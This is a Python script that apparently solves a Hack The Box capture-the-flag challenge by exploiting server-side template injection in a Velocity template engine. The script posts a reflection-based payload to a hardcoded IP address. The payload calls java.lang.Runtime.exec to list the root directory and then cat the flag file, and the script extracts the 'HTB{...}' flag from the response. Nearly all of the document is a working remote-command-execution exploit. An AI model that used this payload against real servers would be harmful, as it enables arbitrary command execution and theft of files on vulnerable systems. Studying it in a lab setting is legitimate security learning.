import requests
import re

def get_data(url, json_data):
    # Send POST request with JSON data
    response = requests.post(url, data=json_data)

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Print the response content
        print("Ok")
        return response.text
    else:
        # Print an error message if the request was not successful
        print(f"Error: {response.status_code}")
        exit(0)
    return 0


url = "http://94.237.50.51:51087"
json_data = {'text': '#set($s="") #set($stringClass=$s.getClass()) #set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder")) #set($inputStreamClass=$stringClass.forName("java.io.InputStream")) #set($readerClass=$stringClass.forName("java.io.Reader")) #set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader")) #set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader")) #set($collectorsClass=$stringClass.forName("java.util.stream.Collectors")) #set($systemClass=$stringClass.forName("java.lang.System")) #set($stringBuilderConstructor=$stringBuilderClass.getConstructor()) #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass)) #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))  #set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime()) #set($process=$runtime.exec("ls /")) #set($null=$process.waitFor())  #set($inputStream=$process.getInputStream()) #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream)) #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader)) #set($stringBuilder=$stringBuilderConstructor.newInstance())  #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator()))) $output'
}
res = get_data(url, json_data)
pattern = re.compile(r'^.*flag.*$', re.MULTILINE)
matches = pattern.findall(res)
print(f"Flag file: {matches[0]}")

json_data = {'text': '#set($s="") #set($stringClass=$s.getClass()) #set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder")) #set($inputStreamClass=$stringClass.forName("java.io.InputStream")) #set($readerClass=$stringClass.forName("java.io.Reader")) #set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader")) #set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader")) #set($collectorsClass=$stringClass.forName("java.util.stream.Collectors")) #set($systemClass=$stringClass.forName("java.lang.System")) #set($stringBuilderConstructor=$stringBuilderClass.getConstructor()) #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass)) #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))  #set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime()) #set($process=$runtime.exec("cat /'+matches[0]+'")) #set($null=$process.waitFor())  #set($inputStream=$process.getInputStream()) #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream)) #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader)) #set($stringBuilder=$stringBuilderConstructor.newInstance())  #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator()))) $output'
}
res = get_data(url, json_data)
pattern = re.compile(r'HTB\{([^}]*)\}')
matches = pattern.search(res)
print(matches.group(0))

